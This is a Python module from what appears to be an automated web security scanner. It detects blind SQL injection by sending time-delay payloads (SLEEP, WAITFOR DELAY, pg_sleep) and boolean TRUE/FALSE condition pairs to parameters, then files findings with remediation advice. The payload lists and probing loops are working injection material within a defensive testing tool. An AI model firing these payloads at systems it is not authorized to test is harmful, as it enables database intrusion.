"""Time-based blind SQL injection.

For the no-error, no-egress case: inject a dialect SLEEP payload and confirm the response
is delayed by ~the sleep time versus a baseline — double-confirmed to rule out network
jitter. Bounded (SLEEP payloads are slow). Deterministic signal (consistent delay).
"""

from __future__ import annotations

import secrets as _secrets
import time
from collections.abc import Callable

from owlforge.engine.classify import SQLI, classify_param

_DELAY = 5
_THRESHOLD_MS = 3800   # injected must exceed baseline by at least this (sleep ~5s)
_PAYLOADS = (
    f"1' AND SLEEP({_DELAY})-- -",                        # MySQL (string ctx)
    f"1 AND SLEEP({_DELAY})",                             # MySQL (numeric ctx)
    f"1'; WAITFOR DELAY '0:0:{_DELAY}'-- -",              # MSSQL
    f"1' || pg_sleep({_DELAY})-- -",                      # PostgreSQL
    f"1' AND 1=(SELECT 1 FROM pg_sleep({_DELAY}))-- -",   # PostgreSQL (alt)
)


def _timed(sandbox, method, url, param, value, headers):
    """Return (status, elapsed_ms) for one request, body-aware."""
    from owlforge.engine.preprobe import _send
    t0 = time.monotonic()
    r = _send(sandbox, method, url, param, value, headers) or {}
    wall = int((time.monotonic() - t0) * 1000)
    el = r.get("elapsed_ms")
    return int(r.get("status") or 0), (int(el) if el is not None else wall)


def _sqli_params(inventory):
    seen, out = set(), []
    for it in inventory:
        for p in (it.get("params") or []):
            if SQLI in classify_param(p):
                key = (it["url"], p)
                if key not in seen:
                    seen.add(key)
                    out.append({"url": it["url"], "param": p,
                                "method": (it.get("method") or "GET").upper()})
    return out


def _file(assessment_id, url, method, param, payload):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"Blind SQL injection (time-based) via '{param}'",
            severity="high", status="validated", confidence="high",
            endpoint=url, method=method,
            technical_analysis=(f"Injecting a time-delay payload into '{param}' ({method} "
                                f"{url}) delayed the response by ~{_DELAY}s versus baseline, "
                                "confirmed on a repeat request — the parameter is SQL-injectable."),
            proof_of_concept=f"{param} = {payload}  ->  response delayed ~{_DELAY}s (x2)",
            impact="Full read (and often write) access to the backend database.",
            remediation="Use parameterized queries / prepared statements; never concatenate "
                        "input into SQL.",
            validation_note="time-based blind SQLi, double-confirmed (deterministic)"))
        s.commit()


def time_based_sqli_scan(assessment_id, inventory, sandbox, session_headers,
                         log: Callable[[str], None] = lambda m: None) -> int:
    if sandbox is None:
        return 0
    targets = _sqli_params(inventory)[:6]
    if not targets:
        return 0
    filed = 0
    for t in targets:
        _s, base = _timed(sandbox, t["method"], t["url"], t["param"], "1", session_headers)
        if base >= _THRESHOLD_MS:
            continue  # endpoint already slow -> timing is unreliable
        for payload in _PAYLOADS:
            _s1, t1 = _timed(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
            if t1 - base < _THRESHOLD_MS:
                continue
            _s2, t2 = _timed(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
            if t2 - base >= _THRESHOLD_MS:   # confirmed twice -> not jitter
                _file(assessment_id, t["url"], t["method"], t["param"], payload)
                filed += 1
                break
    if filed:
        log(f"blind-sqli: {filed} time-based SQL injection(s) confirmed")
    return filed


def _bsig(r: dict) -> tuple[int, int]:
    """Coarse, stable response signature for the boolean oracle (status + length bucket)."""
    return int(r.get("status") or 0), len(r.get("body") or "") // 32


# (TRUE, FALSE) condition pairs for the string and numeric contexts
_BOOL_PAIRS = (
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
)


def _file_boolean(assessment_id, url, method, param, true_pl, false_pl):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"Blind SQL injection (boolean-based) via '{param}'",
            severity="high", status="validated", confidence="high",
            endpoint=url, method=method, repro_url=url, repro_method=method,
            repro_params={param: "1"},
            technical_analysis=(f"A TRUE condition ({true_pl}) returned the baseline response while "
                                f"a FALSE condition ({false_pl}) returned a clearly different one, "
                                f"confirmed on a repeat — '{param}' ({method} {url}) is SQL-injectable "
                                "even though it does not emit an error."),
            proof_of_concept=f"{param}={true_pl!r} (true) vs {param}={false_pl!r} (false) -> responses differ (x2)",
            impact="Full read (and often write) access to the backend database.",
            remediation="Use parameterized queries / prepared statements; never concatenate input into SQL.",
            validation_note="boolean-based blind SQLi, double-confirmed (deterministic)"))
        s.commit()


def boolean_based_sqli_scan(assessment_id, inventory, sandbox, session_headers,
                            log: Callable[[str], None] = lambda m: None) -> int:
    """Confirm boolean-based blind SQLi deterministically: a TRUE condition matches the valid
    baseline while a FALSE one differs (double-checked to reject dynamic-content flapping).
    Catches injectable params that never 500 — the case the pre-probe otherwise only hints at."""
    if sandbox is None:
        return 0
    from owlforge.engine.preprobe import _send
    targets = _sqli_params(inventory)[:8]
    filed = 0
    for t in targets:
        base = _bsig(_send(sandbox, t["method"], t["url"], t["param"], "1", session_headers) or {})
        for true_pl, false_pl in _BOOL_PAIRS:
            rt = _bsig(_send(sandbox, t["method"], t["url"], t["param"], true_pl, session_headers) or {})
            rf = _bsig(_send(sandbox, t["method"], t["url"], t["param"], false_pl, session_headers) or {})
            if rt != base or rf == rt:
                continue
            rt2 = _bsig(_send(sandbox, t["method"], t["url"], t["param"], true_pl, session_headers) or {})
            rf2 = _bsig(_send(sandbox, t["method"], t["url"], t["param"], false_pl, session_headers) or {})
            if rt2 == rt and rf2 == rf:   # stable across a repeat -> not jitter
                _file_boolean(assessment_id, t["url"], t["method"], t["param"], true_pl, false_pl)
                filed += 1
                break
    if filed:
        log(f"boolean-sqli: {filed} boolean-based SQL injection(s) confirmed")
    return filed
